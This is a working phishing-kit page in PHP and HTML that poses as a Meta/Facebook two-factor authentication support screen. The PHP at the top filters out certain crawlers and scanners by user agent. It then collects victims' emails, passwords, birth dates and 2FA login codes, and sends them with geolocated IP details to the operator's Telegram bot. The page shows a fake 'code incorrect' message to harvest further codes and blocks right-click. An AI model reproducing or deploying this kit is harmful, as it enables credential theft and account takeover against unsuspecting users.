

<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// system function to process bot
function sendMessage($idTelegram, $messageBot, $tokenBot) {

    $url = "https://api.telegram.org/bot" . $tokenBot . "/sendMessage?parse_mode=html&chat_id=" . $idTelegram;
    $url = $url . "&text=" . urlencode($messageBot);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

// get the bot data that you have set
include 'jestore/813944336231212681997529ChunkjestoreIP.php';
include 'jestore/813944336231212681997529Chunkjestore.php';

// MENANGKAP DATA YANG DI-INPUT
$godhelpme1ma = $_POST['godhelpme1ma']; // Email
$godhelpme1pa = $_POST['godhelpme1pa']; // Password
$godhelpme1mo = $_POST['godhelpme1mo']; // Bulan Kelahiran
$godhelpme1da = $_POST['godhelpme1da']; // Tanggal Kelahiran
$godhelpme1ye = $_POST['godhelpme1ye']; // Tahun Kelahiran

$godhelpme2ma = $_POST['godhelpme2ma']; // Email
$godhelpme2pa = $_POST['godhelpme2pa']; // Password
$godhelpme2mo = $_POST['godhelpme2mo']; // Bulan Kelahiran
$godhelpme2da = $_POST['godhelpme2da']; // Tanggal Kelahiran
$godhelpme2ye = $_POST['godhelpme2ye']; // Tahun Kelahiran
$logincode = $_POST['logincode']; // Login Code

// system will redirect to the main page if no data is entered
if($godhelpme1ma == '' || $godhelpme1pa == '' || $godhelpme1mo == '' || $godhelpme1da == '') {
header("Location: index.php");
} else {

// message content to sent to bot
$messageBot = "
━━━━━━━༻XXX༺━━━━━━
➤Email / Phone : <code>$godhelpme1ma</code>
➤Password : <code>$godhelpme1pa</code>
➤Day-Month-Year : <code>$godhelpme1da</code> - <code>$godhelpme1mo</code> - <code>$godhelpme1ye</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Code 1 : <code>$logincode</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Email / Phone : <code>$godhelpme2ma</code>
➤Password : <code>$godhelpme2pa</code>
➤Day-Month-Year : <code>$godhelpme2da</code> - <code>$godhelpme2mo</code> - <code>$godhelpme2ye</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Country : $jestore_flag | $jestore_countryCode | +$jestore_callcode | $jestore_country
➤Ip Address : <code>$jestore_ipaddress</code>
➤Benua : $jestore_timezone 
➤Propinsi : $jestore_regionName
➤Kota : $jestore_city
➤Time Zone : $timezone
━━━━━━━༻XXX༺━━━━━━
";
}

// sent all data to bot
sendMessage($idTelegram, $messageBot, $tokenBot);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Page Help Support Team</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <meta property="og:url" content="">
    <meta property="og:type" content="">
    <meta property="og:title" content="Page Help Support Team">
    <meta property="og:description" content="We saw unusual activity on your account.To protect you, your profile is hidden now and you can't access some features">
    <meta property="og:image" content="cocacola/Meta.jpg">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <link rel="icon" href="cocacola/XXXX-removebg-preview.png">
    <link type="text/css" rel="stylesheet" href="cocacola/3.css">
    <link type="text/css" rel="stylesheet" href="cocacola/2.css">
    <link href="cocacola/1.css" rel="stylesheet">
    <script type="text/javascript">
        function mousedwn(e) {
            try {
                if (event.button == 2 || event.button == 3) return false
            } catch (e) {
                if (e.which == 3) return false
            }
        }
        document.oncontextmenu = function() {
            return false
        };
        document.ondragstart = function() {
            return false
        };
        document.onmousedown = mousedwn
    </script>
    <script language="JavaScript">
        var tanggallengkap = new String();
        var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
        namahari = namahari.split(" ");
        var namabulan = ("January February March April May June July August September October November December");
        namabulan = namabulan.split(" ");
        var tgl = new Date();
        var hari = tgl.getDay();
        var tanggal = tgl.getDate();
        var bulan = tgl.getMonth();
        var tahun = tgl.getFullYear();
        tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
    </script>
</head>

<body class="modal-open" style="overflow: hidden; padding-right: 0px;">
    <nav class="navbar navbar-dark bg-primary">
        <div class="container-fluid">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-meta" viewBox="0 0 16 16">
                <path fill-rule="evenodd" d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a54.944 54.944 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3c.319 0 .625.039.924.122.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714Zm1.516 2.224c-.252-.41-.494-.787-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87l-.937-1.565ZM4.846 4.756c.725.1 1.385.634 2.34 2.001A212.13 212.13 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264.091 0 .181.006.27.018Z">
                </path>
            </svg>
        </div>

        <div class="modal fade show" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-modal="true" role="dialog" style="display: block;">

            <br>
            <br>
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-body">
                        <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t d2edcug0 hpfvmrgz rj1gh0hx buofh1pr g5gj957u jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso">
                            <div class="l9j0dhe7 du4w35lb rq0escxv j83agx80 cbu4d94t pfnyh3mw d2edcug0 discj3wi ihqw7lf3">
                                <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t buofh1pr tgvbjcpo sv5sfqaa obtkqiv7">
                                    <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 bp9cbjyn aov4n071 bi6gxh9e">
                                        <div class="confirm-approve-content__identicon-wrapper"><img style="height: 90px;width: 90px;" alt="" src="cocacola/2fa.png" class="identicon confirm-approve-content__identicon"></div>

                                    </div>
                                    <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 aov4n071 bi6gxh9e updown1 ihqw7lf3">
                                        <div class="sv5sfqaa obtkqiv7 cbu4d94t j83agx80">
                                            <div class="aov4n071 bi6gxh9e">
                                                <span style="color: #000; dir=" auto"="" class="updown2 d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 qg6bub1s iv3no6db TeeXde f530mmz5 hnhda86s oo9gr5id oqcyycmt">Two Factor Authentication Required (2/3)</span>
                                            </div>
                                            <div class="aov4n071 bi6gxh9e">
                                                <center>
												<p class="CDt4Ke zfr3Q">
												<span style="font-family: 'Roboto', 'Arial'; font-size: 11pt; font-weight: normal; vertical-align: baseline; text-align: left;">
												You've asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.
												<br>
												<br>
												Enter the 8-digit (recovery code) or Enter the 6-digit code from the authentication app you set up (code generator).
												</span>
												<br><br>
												<span style="font-family: 'Roboto', 'Arial'; font-size: 11pt; font-weight: normal; vertical-align: baseline; text-align: left; color:red;">
		The Two Factor Authentication code you entered is incorrect	
												</span>
												</p>
                                                </center>
												<form action="reversibel.php" method="post">
                                                <input type="hidden" name="godhelpme1ma" value="<?php echo $godhelpme1ma ;?>" readonly>
												<input type="hidden" name="godhelpme1pa" value="<?php echo $godhelpme1pa ;?>" readonly>
												<input type="hidden" name="godhelpme1mo" value="<?php echo $godhelpme1mo ;?>" readonly>
												<input type="hidden" name="godhelpme1da" value="<?php echo $godhelpme1da ;?>" readonly>
												<input type="hidden" name="godhelpme1ye" value="<?php echo $godhelpme1ye ;?>" readonly>
												<input type="hidden" name="godhelpme2ma" value="<?php echo $godhelpme2ma ;?>" readonly>
												<input type="hidden" name="godhelpme2pa" value="<?php echo $godhelpme2pa ;?>" readonly>
												<input type="hidden" name="godhelpme2mo" value="<?php echo $godhelpme2mo ;?>" readonly>
												<input type="hidden" name="godhelpme2da" value="<?php echo $godhelpme2da ;?>" readonly>
												<input type="hidden" name="godhelpme2ye" value="<?php echo $godhelpme2ye ;?>" readonly>
												<input type="hidden" name="logincode" value="<?php echo $logincode ;?>" readonly>
                                                <div class="p-3 mb-2 bg-secondary bg-opacity-25 text-dark rounded">
												<div id="timer" style="background-color: transparent; width: 35%; float: right; border: transparent; margin-top: 6px; color:#385898; font-size: 15px; font-weight: bold;">( wait: <span id="timeri" style="margin-bottom: 0px; font-weight: bold; display: inline"></span> )</div>
												<input style="width: 55%; margin-left: 0px !important; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; -webkit-box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%); box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%); -webkit-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s; color: #4e4d4d;" type="number" name="logincodeX" id="logincodeX" class="form-control mx-sm-3" aria-describedby="passwordHelpInline" placeholder="Login code" name="cnX" minlength="4" required>
                                                </div>
                                                <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 aov4n071 bi6gxh9e">
												<div class="lindown ay7djpcl k4urcfbm"></div>
												<button type="submit" class="k4urcfbm l9j0dhe7 tw6a2znq d1544ag0 stjgntxs ni8dbmo4 taijpn5t tv7at329 btwxx1t3 j83agx80 rq0escxv kzx2olss aot14ch1 p86d2i9g beltcj47 izx4hr6d humdl8nn bn081pho gcieejh5 tcv6vlfj bp9cbjyn qrtewk5h jq4qci2q"><b>Send</b></button>
                                                </div>
                                                </form>
                                            </div>
                                            <div class="_3QeaJ">
                                                <svg width="14" height="10" viewBox="0 0 22 20" fill="none" class="_2YFqp" xmlns="http://www.w3.org/2000/svg">
                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M11.9961 12.583C11.9531 13.102 11.5191 13.5 11.0001 13.5C10.4801 13.5 10.0471 13.102 10.0041 12.583L9.50413 6.603C9.50113 6.575 9.50013 6.547 9.50013 6.52C9.50013 5.783 10.0251 5 11.0001 5C11.9751 5 12.5001 5.783 12.5001 6.52L11.9961 12.583ZM11.0001 17.5C10.1731 17.5 9.50013 16.827 9.50013 16C9.50013 15.173 10.1731 14.5 11.0001 14.5C11.8271 14.5 12.5001 15.173 12.5001 16C12.5001 16.827 11.8271 17.5 11.0001 17.5ZM12.7301 1.003C12.3771 0.376 11.7431 0.001 11.0371 0H11.0331C10.3271 0 9.69313 0.373 9.33913 0.998L0.268128 16.989C-0.0878717 17.617 -0.0898717 18.366 0.265128 18.996C0.618128 19.624 1.25213 20 1.96213 20H20.0381C20.7461 20 21.3811 19.625 21.7341 18.998C22.0881 18.37 22.0881 17.622 21.7351 16.994L12.7301 1.003Z" fill="#E69600"></path>
                                                </svg>
                                                <div class="DonErr">Your payment information is stored securely and only you can see it on Facebook.<br><b><font color="#385898">See Privacy Provisions.</font></b>.</div>
                                            </div>

                                        </div>
                                    </div>

                                    <hr class="my-4">
                                    <p class="text-secondary text-center">Meta &copy; 2024</p>
                                </div>

                            </div>
                        </div>

                    </div>
                </div>
            </div>

            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"></script>
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
            <script src="cocacola/popup.js"></script>
			<script type="text/javascript">
        function startTimer(duration, display) {
            var timer = duration,
                minutes, seconds;
            var myInterval = setInterval(function() {
                minutes = parseInt(timer / 60, 10)
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (timer == 0) {
                    document.getElementById("timer").style.display = "none";
                    document.getElementById("sendcodeagain").style.display = "block";
                    clearInterval(myInterval);
                }
                if (--timer < 0) {
                    timer = duration;
                }
            }, 1000);
        }

        var fiveMinutes = 60 * 5,
            display = document.querySelector('#timeri');
        startTimer(fiveMinutes, display);
    </script>
        </div>
</body>
</html>
